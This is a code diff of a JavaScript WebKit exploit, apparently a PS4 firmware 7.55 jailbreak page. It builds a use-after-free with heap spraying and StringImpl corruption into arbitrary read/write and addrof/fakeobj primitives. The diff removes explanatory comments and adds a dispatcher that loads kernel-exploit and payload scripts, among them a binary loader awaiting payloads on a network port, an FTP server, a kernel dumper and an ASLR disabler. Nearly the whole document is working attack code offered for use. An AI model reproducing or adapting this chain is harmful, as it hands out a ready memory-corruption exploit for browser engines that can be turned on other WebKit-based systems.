@@ -35,7 +35,6 @@ var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
 var g_textarea_div_elem = null;
-
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -47,36 +46,36 @@ var g_input = null;
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
 
-/* Executed after deleteBubbleTree */
+
 function setupRW() {
-	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
+	
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("[+] Succesfully got a relative R/W");
+			debug_log("-> Succesfully got a relative R/W");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
 
-	debug_log("[+] Setting up arbitrary R/W");
+	debug_log("-> Setting up arbitrary R/W");
 
-	/* Retrieving the ArrayBuffer address using the relative read */
+	
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
 	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 
-	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
+	
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
 	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
 		g_ab_index = ab_index + LENGTH_JSVIEW;
 	else
 		g_ab_index = ab_index - LENGTH_JSVIEW;
 
-	/* Overding the length of one JSArrayBufferView with a known value */
+	
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;
 
-	/* Looking for the slave JSArrayBufferView */
+	
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length === 0x41) {
 			g_ab_slave = g_arr_ab_3[i];
@@ -87,28 +86,28 @@ function setupRW() {
 	if (g_ab_slave === null)
 		die("[!] Didn't found the slave JSArrayBufferView");
 
-	/* Extending the JSArrayBufferView length */
+	
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("[+] Testing arbitrary R/W");
+	debug_log("-> Testing arbitrary R/W");
 
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
-	debug_log("[+] Succesfully got arbitrary R/W!");
+	debug_log("-> Succesfully got arbitrary R/W!");
 
-	/* Restore the overidden vtable pointer */
+	
 	write64(guess_htmltextarea_addr, saved_vtable);
 
-	/* Cleanup memory */
+	
 	cleanup();
 
-	/* Set up addrof/fakeobj primitives */
+	
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
 	for(var i = 15; i >= 8; i--)
@@ -116,13 +115,116 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-		debug_log("Webkit explorado. <font color=\"#ee596f\">Iniciando a exploração do kernel... PONTO CRÍTICO</font>");
+	if(localStorage.autoExploit=="true")
+		debug_log("-> WebKit Exploit Complete.. Running Kernel Exploit !!");
+	else
+		debug_log("-> WebKit Exploit Complete.. Run the Kernel Exploit to Jailbreak !!");
 
-	/* Getting code execution */
-	/* ... */
+	
+	
 	if(window.postExploit)
 		window.postExploit();
 
+}
+
+function toggle_payload(pld){
+	if(pld == "exploit"){
+		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
+		preloadScripts(['jb/jb.js']);
+	}else if(pld == "exploit_old"){
+		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
+		preloadScripts(['jb/oldjb.js']);
+	}else if(pld == "binloader"){
+		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
+		preloadScripts(['payloads/preloader.js', 'payloads/loader.js']);
+	}else if(pld == "mira75X"){
+		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
+		if(fw=="755"){
+			preloadScripts(['payloads/preloader.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);
+		}else{
+			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);	
+		}
+	}else if(pld == "mira2b"){
+		document.getElementById("progress").innerHTML="Loading MIRA + SPOOF.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/mira2b.js', 'payloads/loader.js']);
+	}else if(pld == "ftp"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
+		preloadScripts(['payloads/preloader.js', 'payloads/ftp.js', 'payloads/loader.js']);
+	}else if(pld == "app2usb"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/app2usb.js', 'payloads/loader.js']);
+	}else if(pld == "disableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/disableupdates.js', 'payloads/loader.js']);
+	}else if(pld == "enableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/enableupdates.js', 'payloads/loader.js']);
+	}else if(pld == "backup"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/backup.js', 'payloads/loader.js']);
+	}else if(pld == "restore"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/restore.js', 'payloads/loader.js']);
+	}else if(pld == "rifrenamer"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/rifrenamer.js', 'payloads/loader.js']);
+	}else if(pld == "todex"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/todex.js', 'payloads/loader.js']);
+	}else if(pld == "dumper"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/dumper.js', 'payloads/loader.js']);
+	}else if(pld == "disableaslr"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/disableaslr.js', 'payloads/loader.js']);
+	}else if(pld == "kerneldumper"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/kerneldumper.js', 'payloads/loader.js']);
+	}else if(pld == "kernelclock"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/kernelclock.js', 'payloads/loader.js']);
+	}else if(pld == "fancontrol"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/fancontrol.js', 'payloads/loader.js']);
+	}else if(pld == "enablebrowser"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/enablebrowser.js', 'payloads/loader.js']);
+	}else if(pld == "historyblocker"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/historyblocker.js', 'payloads/loader.js']);
+	}else if(pld == "exitidu"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/exitidu.js', 'payloads/loader.js']);
+	}else if(pld == "ps4debug"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/ps4debug.js', 'payloads/loader.js']);
+	}else if(pld == "goldhen"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		if(fw=="755"){
+			preloadScripts(['payloads/preloader.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);
+		}else{
+			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);	
+		}
+	}else if(pld == "goldhenold"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/goldhen.js', 'payloads/loader.js']);
+	}else if(pld == "webrte"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['payloads/preloader.js', 'payloads/webrte.js', 'payloads/loader.js']);
+	}
+	if(window.postPayload)
+		window.postPayload();
+	payload_finished(pld);
+	
+}
+
+function payload_finished(payload)
+{
+	if(payload == "binloader"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
+	} else if(payload != "exploit" && payload != "exploit_old"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55 Payload Loaded Succesfully !!"; }, 7000);
+	}
 }
 
 function read(addr, length) {
@@ -176,10 +278,7 @@ function cleanup() {
 	g_frames = null;
 }
 
-/*
- * Executed after buildBubbleTree
- * and before deleteBubbleTree
- */
+
 function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
@@ -190,16 +289,16 @@ function confuseTargetObjRound2() {
 }
 
 
-/* Executed after deleteBubbleTree */
+
 function leakJSC() {
-	debug_log("[+] Looking for the smashed StringImpl...");
+	debug_log("-> Looking for the smashed StringImpl...");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
-	/* Looking for the smashed string */
+	
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("[+] StringImpl corrupted successfully");
+			debug_log("-> StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -208,7 +307,7 @@ function leakJSC() {
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
 
-	debug_log("[+] Got a relative read");
+	debug_log("-> Got a relative read");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -216,10 +315,10 @@ function leakJSC() {
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
-	/* Spraying JSView */
+	
 	let tmp = [];
 	for (let i = 0; i < 0x10000; i++) {
-		/* The last allocated are more likely to be allocated after our relative read */
+		
 		if (i >= 0xfc00)
 			g_arr_ab_3.push(new Uint8Array(ab));
 		else
@@ -227,24 +326,16 @@ function leakJSC() {
 	}
 	tmp = null;
 
-	/*
-	 * Force JSC ref on FastMalloc Heap
-	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
-	 */
+
 	var props = [];
 	for (var i = 0; i < 0x400; i++) {
 		props.push({ value: 0x42424242 });
 		props.push({ value: g_arr_ab_3[i] });
 	}
 
-	/* 
-	 * /!\
-	 * This part must avoid as much as possible fastMalloc allocation
-	 * to avoid re-using the targeted object 
-	 * /!\ 
-	 */
-	/* Use relative read to find our JSC obj */
-	/* We want a JSView that is allocated after our relative read */
+
+	
+	
 	while (g_jsview_leak === null) {
 		Object.defineProperties({}, props);
 		for (let i = 0; i < 0x800000; i++) {
@@ -279,27 +370,20 @@ function leakJSC() {
 			}
 		}
 	}
-	/* 
-	 * /!\
-	 * Critical part ended-up here
-	 * /!\ 
-	 */
 
-	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);
 
-	/* Run the exploit again */
+	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
+
+	
 	prepareUAF();
 }
 
-/*
- * Executed after buildBubbleTree
- * and before deleteBubbleTree
- */
+
 function confuseTargetObjRound1() {
-	/* Force allocation of StringImpl obj. beyond Timer address */
+	
 	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
-	/* Checking for leaked data */
+	
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
 
@@ -307,45 +391,36 @@ function confuseTargetObjRound1() {
 
 	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
-	/*
-	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
-	 * the next 5s
-	 */
+
 	setTimeout(leakJSC, 6000);
 }
 
 function handle2() {
-	/* focus elsewhere */
+	
 	input2.focus();
 }
 
 function reuseTargetObj() {
-	/* Delete ValidationMessage instance */
+	
 	document.body.appendChild(g_input);
 
-	/*
-	 * Free ValidationMessage neighboors.
-	 * SmallLine is freed -> SmallPage is cached
-	 */
+
 	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
 		g_frames[i].setAttribute("rows", ',');
 
-	/* Get back target object */
+	
 	for (let i = 0; i < NB_REUSE; i++) {
 		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
 		let view = new Float64Array(ab);
 
-		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[0] = guess_htmltextarea_addr.asDouble();   
+		view[3] = guess_htmltextarea_addr.asDouble();   
 
 		g_arr_ab_1.push(view);
 	}
 
 	if (g_round == 1) {
-		/*
-		 * Spray a couple of StringImpl obj. prior to Timer allocation
-		 * This will force Timer allocation on same SmallPage as our Strings
-		 */
+	
 		sprayStringImpl(0, SPRAY_STRINGIMPL);
 
 		g_frames = [];
@@ -359,15 +434,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("[+] m_timer: " + g_timer_leak);
-	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
-	debug_log("[+] m_messageBody: " + g_message_body_leak);
+	debug_log("-> m_timer: " + g_timer_leak);
+	debug_log("-> m_messageHeading: " + g_message_heading_leak);
+	debug_log("-> m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("[+] Found fake ValidationMessage");
+			debug_log("-> Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -397,14 +472,14 @@ function prepareUAF() {
 	document.body.appendChild(div);
 	div.appendChild(g_input);
 
-	/* First half spray */
+	
 	for (let i = 0; i < NB_FRAMES / 2; i++)
 		g_frames[i].setAttribute("rows", g_rows1);
 
-	/* Instantiate target obj */
+	
 	g_input.reportValidity();
 
-	/* ... and the second half */
+	
 	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
 		g_frames[i].setAttribute("rows", g_rows2);
 
@@ -412,29 +487,24 @@ function prepareUAF() {
 	g_input.autofocus = true;
 }
 
-/* HTMLElement spray */
+
 function sprayHTMLTextArea() {
-	debug_log("[+] Spraying HTMLTextareaElement ...");
+	debug_log("-> Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
 
-	/* Add a style to avoid textarea display */
+	
 	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';
 
-	/*
-	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
-	 * allocation of the node attributes and an IsoHeap allocation of the
-	 * Element. The virtual page layout will look something like that:
-	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...] DARKMODDER
-	 */
+
 	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
 		textarea_div_elem.appendChild(element.cloneNode());
 }
 
-/* StringImpl Spray */
+
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
 		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
@@ -444,14 +514,14 @@ function sprayStringImpl(start, end) {
 
 function go() {
 	if(localStorage.is75XV2Cached){
-		/* Init spray */
+		
 		sprayHTMLTextArea();
 
 		if(window.midExploit)
 			window.midExploit();
 
 		g_input = input1;
-		/* Shape heap layout for obj. reuse */
+		
 		prepareUAF();
 	}
 }
